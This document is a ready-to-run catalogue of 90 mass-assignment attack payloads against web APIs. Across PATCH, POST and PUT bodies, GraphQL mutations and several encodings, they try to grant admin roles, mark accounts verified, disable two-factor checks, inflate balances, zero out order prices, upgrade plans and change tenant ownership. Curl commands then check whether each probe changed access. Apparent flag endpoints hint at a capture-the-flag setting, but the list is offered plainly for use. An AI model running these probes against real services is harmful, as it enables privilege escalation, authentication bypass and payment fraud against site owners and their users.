# Probe catalogue — the numbered probe set, ready to run

## The privilege probes

```
P1:  PATCH /users/me {"role":"admin"}
P2:  PATCH /users/me {"is_admin":true}
P3:  PATCH /users/me {"isAdmin":true}
P4:  PATCH /users/me {"is_staff":true}
P5:  PATCH /users/me {"permissions":["*"]}
P6:  PATCH /users/me {"groups":[{"id":1}]}
P7:  PATCH /users/me {"roles":["admin"]}
P8:  PATCH /users/me {"role_ids":[1]}
P9:  PATCH /users/me {"access_level":9}
P10: PATCH /users/me {"_t":"AdminUser"}
P11: PATCH /users/me {"type":"admin"}
P12: PATCH /users/me {"admin":true}
```

## The nested probes

```
P13: PATCH /users/me {"profile":{"role":"admin"}}
P14: PATCH /users/me {"settings":{"admin":true}}
P15: PATCH /users/me {"preferences":{"role":"admin"}}
P16: PATCH /users/me {"metadata":{"is_admin":true}}
P17: PATCH /users/me {"user":{"role":"admin"}}
P18: PATCH /users/me {"profile_attributes":{"role":"admin"}}
P19: PATCH /users/me {"membership":{"role":"admin"}}
P20: PATCH /users/me {"billing":{"role":"admin"}}
```

## The state probes

```
P21: PATCH /users/me {"verified":true}
P22: PATCH /users/me {"is_active":true}
P23: PATCH /users/me {"isActive":true}
P24: PATCH /users/me {"approved":true}
P25: PATCH /users/me {"activated":true}
P26: PATCH /users/me {"email_verified_at":"2024-01-01"}
P27: PATCH /users/me {"onboarding_complete":true}
P28: PATCH /users/me {"mfa_enabled":false}
P29: PATCH /users/me {"bypass_2fa":true}
P30: PATCH /users/me {"status":"active"}
```

## The economic probes

```
P31: PATCH /users/me {"balance":99999}
P32: PATCH /users/me {"credits":99999}
P33: PATCH /users/me {"wallet":99999}
P34: PATCH /users/me {"points":99999}
P35: POST /orders    {"product":1,"price":0}
P36: POST /orders    {"product":1,"price":0.01}
P37: POST /orders    {"product":1,"total":0}
P38: POST /orders    {"product":1,"discount":100}
P39: POST /orders    {"product":1,"unit_price":0}
P40: POST /orders    {"product":1,"quantity":-1}
```

## The plan probes

```
P41: PATCH /users/me {"plan":"enterprise"}
P42: PATCH /users/me {"plan":"pro"}
P43: PATCH /users/me {"tier":"pro"}
P44: PATCH /users/me {"tier":"enterprise"}
P45: PATCH /users/me {"subscription":{"type":"lifetime"}}
P46: PATCH /users/me {"features":["premium","admin"]}
P47: PATCH /users/me {"pro":true}
P48: PATCH /users/me {"vip":true}
P49: PATCH /users/me {"lifetime":true}
P50: PATCH /users/me {"seats":999}
```

## The carrier probes

```
P51: PATCH /users/me role=admin                    (form)
P52: PATCH /users/me -F 'role=admin'               (multipart)
P53: PATCH /users/me user[role]=admin              (prefixed)
P54: PATCH /users/me user.role=admin               (dotted)
P55: PATCH /users/me User.Role=admin               (.NET case)
P56: PATCH /users/me role[]=admin                  (array)
P57: PATCH /users/me {"role":1}                    (typed int)
P58: PATCH /users/me {"role":true}                 (typed bool)
P59: PATCH /users/me {"role":"user","role":"admin"} (dup)
P60: PATCH /users/me?role=admin                    (query)
```

## The create/other-endpoint probes

```
P61: POST /register  {"username":"x","password":"p","role":"admin"}
P62: POST /register  {"username":"x","password":"p","is_admin":true}
P63: POST /register  {"username":"x","password":"p","verified":true}
P64: POST /register  username=x&password=p&role=admin   (form)
P65: PUT  /users/:id {full body,"role":"admin"}
P66: PUT  /users/:id {full body,"verified":true}
P67: POST /orders    {"status":"shipped"}
P68: POST /orders    {"paid":true}
P69: PATCH /users/me {"author_id":1,"content":"x"}
P70: POST /import    [{"username":"x","role":"admin"}]
```

## The GraphQL probes

```
P71: mutation{ createUser(input:{username:"x",role:ADMIN}) }
P72: mutation{ updateUser(id:9,input:{role:ADMIN}) }
P73: mutation{ updateUser(id:9,input:{isAdmin:true}) }
P74: mutation{ updateUser(id:9,input:{verified:true}) }
P75: mutation{ updateUser(id:9,input:{permissions:["*"]}) }
P76: mutation{ updateProfile(input:{settings:{admin:true}}) }
P77: mutation{ createOrder(input:{price:0}) }
P78: mutation{ updateUser(id:9,input:{balance:99999}) }
```

## The ownership/workflow probes

```
P79: PATCH /users/me {"tenant_id":1}
P80: PATCH /users/me {"org_id":1}
P81: PATCH /users/me {"team_id":1}
P82: PATCH /users/me {"created_by":1}
P83: POST /orders    {"status":"shipped"}
P84: POST /orders    {"order_status":"shipped"}
P85: PATCH /users/me {"status":"approved"}
P86: PATCH /users/me {"state":"done"}
P87: PATCH /users/me {"current_step":99}
P88: PATCH /users/me {"review_status":"approved"}
P89: POST /flag-submissions {"correct":true}
P90: PATCH /users/me {"debug":true}
```

## The read-back per probe

```bash
curl -b "$JAR" "$BASE/api/me" | jq '.role, .is_admin, .verified, .balance'
curl -b "$JAR" "$BASE/api/users/<id>" | jq 'keys'
```

## The decision per probe

```bash
curl -b "$JAR" "$BASE/admin"          # privilege gates
curl -b "$JAR" "$BASE/flag"           # verify gate
curl -b "$JAR" "$BASE/premium"        # plan gate
curl -b "$JAR" -X POST "$BASE/checkout"   # totals
```

90 probes, ordered: widest binder → highest-value semantic → least-
tested carrier. Stop at the first stored+decision-changed pair.
